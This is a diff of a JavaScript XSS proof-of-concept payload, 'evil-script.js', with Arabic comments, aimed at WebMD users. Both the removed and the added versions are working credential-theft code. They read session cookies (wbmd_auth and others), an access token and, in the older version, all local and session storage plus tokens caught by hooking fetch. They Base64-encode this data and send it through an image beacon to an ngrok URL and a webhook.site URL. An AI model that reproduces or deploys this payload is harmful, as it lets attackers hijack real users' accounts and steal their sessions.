@@ -1,53 +1,39 @@
-      // evil-script.js - PoC نظيف وبسيط
-console.log("Evil script LOADED successfully via postMessage on WebMD!");
-alert("XSS PoC: Script injected! Cookies visible in console: " + document.cookie);
-         // تشفير الكوكيز بـ Base64 قبل إرسالها
-//var stolenData = btoa(document.cookie); 
-//new Image().src = "https://webhook.site/01958d43-9c63-44e0-85c8-4df93c65ec75/log?data=" + encodeURIComponent(stolenData);
+// evil-script.js - PROOF OF CONCEPT (REMOTE EXFILTRATION)
+console.log("PoC Script Executed - Exfiltrating Data...");
 
-(function() {
-    const attackerURL = "https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/exfiltrate=";
-    //const attackerURL = "https://webhook.site/0bfa1fd8-da82-45ef-bcde-1ae997123369/exfiltrate=";
-    // 1. وظيفة التهريب: ترسل البيانات مشفرة Base64 إلى سيرفر المهاجم
-    function sendHome(data, type) {
-        const payload = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
-        new Image().src = `${attackerURL}?type=${type}&data=${payload}`;
-    }
+// 1. استخراج التوكن الخاص بالضحية
+const token = window.__INITIAL_STATE__?.accessToken || 'Not_Found';
 
-    // 2. مراقب الكوكيز: يسحب الكوكيز الحالية ويراقب أي تغيير (لصيد WBMD_AUTH)
-    let lastCookies = "";
-    setInterval(() => {
-        if (document.cookie !== lastCookies) {
-            lastCookies = document.cookie;
-            sendHome({ cookies: lastCookies, url: location.href }, "cookies_changed");
-        }
-    }, 5000);
+// 2. استخراج الكوكيز الحساسة فقط لتقليل حجم البيانات
+const wanted = ['wbmd_auth', 'wbmd_sess', 'wbmd_sauth'];
+let criticalCookies = document.cookie.split('; ')
+    .filter(c => wanted.some(w => c.toLowerCase().includes(w)))
+    .join('; ');
 
-    // 3. اعتراض الـ API (Fetch): لصيد access_token و refresh_token من الردود
-    const originalFetch = window.fetch;
-    window.fetch = async (...args) => {
-        const response = await originalFetch(...args);
-        const clone = response.clone();
-        
-        clone.json().then(data => {
-            // إذا كان الرد يحتوي على أي نوع من التوكينات
-            if (data.access_token || data.refresh_token || data.token) {
-                sendHome({
-                    endpoint: args[0],
-                    tokens: data
-                }, "api_tokens_intercepted");
-            }
-        }).catch(() => { /* ليس ملف JSON، يتجاهله */ });
+// 3. تجهيز البيانات (Payload)
+const payload = {
+    t: token,
+    c: criticalCookies || "No_Cookies",
+    u: window.location.href,
+    ts: new Date().getTime()
+};
 
-        return response;
-    };
+// 4. تشفير البيانات بصيغة Base64 لتجنب مشاكل الرموز في الروابط
+const encodedData = btoa(JSON.stringify(payload));
 
-    // 4. نهب التخزين: سحب كل ما هو مخزن في LocalStorage و SessionStorage
-    const storageData = {
-        local: { ...localStorage },
-        session: { ...sessionStorage }
-    };
-    sendHome(storageData, "storage_dump");
+// 5. رابط الاستقبال (استبدل هذا برابط Webhook.site الخاص بك)
+const exfilUrl = "https://webhook.site/0bfa1fd8-da82-45ef-bcde-1ae997123369"; 
 
-    console.log("%c [Security Audit] All observers initialized. Standing by...", "color: red; font-weight: bold;");
-})();
+// 6. الإرسال عبر Image Beacon (الطريقة الأضمن)
+// المتصفح سيعتبر هذا طلب صورة وسيرسل البيانات في الرابط (Query String)
+const logger = new Image();
+logger.src = `${exfilUrl}?data=${encodedData}`;
+
+// 7. إظهار تنبيه للتأكيد البصري في الفيديو
+alert(
+    "CRITICAL: XSS Executed!\n" +
+    "Session Token Stolen: " + token.substring(0, 15) + "...\n" +
+    "Data exfiltrated to: attacker-server.com"
+);
+
+console.log("Data sent to attacker server via Image Beacon.");
